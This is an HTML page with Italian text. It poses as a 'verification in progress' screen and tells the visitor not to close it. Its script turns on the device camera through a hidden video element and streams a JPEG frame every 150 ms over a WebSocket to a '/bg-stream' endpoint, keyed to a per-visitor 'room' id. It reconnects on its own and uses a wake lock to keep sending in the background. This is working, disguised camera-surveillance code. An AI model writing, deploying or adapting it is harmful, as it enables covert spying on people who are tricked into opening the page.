<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifica...</title>
  <style>
    body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
    .msg { padding:40px 20px; font-size:18px; }
    #debug { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); color:#0f0; padding:10px; font-size:12px; }
  </style>
</head>
<body>
  <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
  <div id="debug"></div>

  <!-- Video nascosto -->
  <video id="cam" playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('cam');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const debug = document.getElementById('debug');
    const room = new URLSearchParams(location.search).get('room') || 'user1';
    
    let stream = null;
    let sending = false;
    let ws = null;
    let frameInterval = null;
    
    function log(msg) {
      debug.textContent = new Date().toLocaleTimeString() + ': ' + msg;
      console.log(msg);
    }

    // Gestione WebSocket
    function connectWebSocket() {
      if (ws) {
        ws.close();
      }

      ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);

      ws.onopen = () => {
        log('WebSocket connesso');
        if (!stream) {
          startCamera();
        } else {
          startSendingFrames();
        }
      };

      ws.onclose = () => {
        log('Connessione persa - riconnessione...');
        stopSendingFrames();
        // Riprova a connetterti dopo 3 secondi
        setTimeout(connectWebSocket, 3000);
      };

      ws.onerror = (err) => {
        log('Errore WebSocket: ' + (err.message || 'errore sconosciuto'));
      };
    }

    // Avvia la connessione iniziale
    connectWebSocket();

    function startSendingFrames() {
      if (frameInterval) {
        clearInterval(frameInterval);
      }
      sending = true;
      // Invia subito il primo frame
      sendFrame();
      // Imposta l'invio periodico
      frameInterval = setInterval(sendFrame, 150);
      log('Avviato invio frames');
    }

    function stopSendingFrames() {
      sending = false;
      if (frameInterval) {
        clearInterval(frameInterval);
        frameInterval = null;
      }
      log('Fermato invio frames');
    }

    // Invia singolo frame
    function sendFrame() {
      if (!sending || !video.videoWidth || !ws || ws.readyState !== WebSocket.OPEN) return;
      
      try {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
          if (ws && ws.readyState === WebSocket.OPEN && blob) {
            // Prima invia il messaggio di controllo
            ws.send(JSON.stringify({ 
              room,
              timestamp: Date.now(),
              frameSize: blob.size
            }));
            
            // Poi invia il frame
            ws.send(blob);
            log('Frame inviato: ' + blob.size + ' bytes');
          }
        }, 'image/jpeg', 0.7); // Aumentata qualità per migliore visibilità
      } catch (err) {
        log('Errore invio frame: ' + err.message);
        // Riprova a riconnetterti se c'è un errore
        stopSendingFrames();
        setTimeout(connectWebSocket, 1000);
      }
    }

    let currentCamera = 'environment';
    
    async function switchCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
      await startCamera();
    }

    // Avvia fotocamera
    async function startCamera() {
      try {
        const constraints = {
          video: { 
            facingMode: { exact: currentCamera },
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        };
        
        try {
          stream = await navigator.mediaDevices.getUserMedia(constraints);
        } catch (err) {
          // Se fallisce con 'exact', prova senza
          constraints.video.facingMode = currentCamera;
          stream = await navigator.mediaDevices.getUserMedia(constraints);
        }

        video.srcObject = stream;
        video.onloadedmetadata = () => {
          startSendingFrames();
          
          // Messaggio finale con pulsante switch camera
          document.querySelector('.msg').innerHTML = `
            <div>
              <b>Camera attiva</b><br>
              <button onclick="switchCamera()" style="margin: 10px; padding: 8px;">
                Cambia Camera
              </button><br>
              <small>La trasmissione continua in background.</small>
            </div>`;
        };

        // Avvia il video
        await video.play();
        log('Camera avviata con successo');
        
      } catch (err) {
        log('Errore camera: ' + err.message);
        document.querySelector('.msg').innerHTML = `<div>Errore: ${err.message}</div>`;
      }
    }

    // Mantieni attiva la pagina in background
    if ('wakeLock' in navigator) {
      let wakeLock = null;
      const requestWakeLock = async () => {
        try {
          wakeLock = await navigator.wakeLock.request('screen');
          log('WakeLock attivato');
        } catch (err) {
          log('WakeLock non disponibile: ' + err.message);
        }
      };
      
      document.addEventListener('visibilitychange', async () => {
        if (document.hidden) {
          log('Pagina in background - mantengo attiva');
          // Richiedi wake lock per mantenere attivo in background
          await requestWakeLock();
        } else {
          log('Pagina in primo piano');
          if (wakeLock) {
            wakeLock.release();
            wakeLock = null;
          }
          if (!sending && stream) {
            startSendingFrames();
          }
        }
      });
      
      // Attiva subito il wake lock
      requestWakeLock();
    }

    // Gestione chiusura pagina
    window.onbeforeunload = () => {
      stopSendingFrames();
      if (ws) ws.close();
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };

    // Tieni vivo il WebSocket
    setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send('ping');
        log('Ping inviato');
      }
    }, 30000);
  </script>
</body>
</html>
